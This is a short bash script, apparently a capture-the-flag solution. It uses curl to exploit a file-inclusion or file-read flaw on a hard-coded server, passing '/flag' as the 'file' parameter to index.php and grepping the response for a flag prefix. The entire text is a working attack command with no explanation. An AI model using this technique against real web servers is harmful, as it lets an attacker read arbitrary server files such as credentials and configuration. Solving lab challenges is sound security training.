#!/bin/bash


curl http://141.85.224.104:40001/index.php?file=/flag >> request
cat request | grep SIS
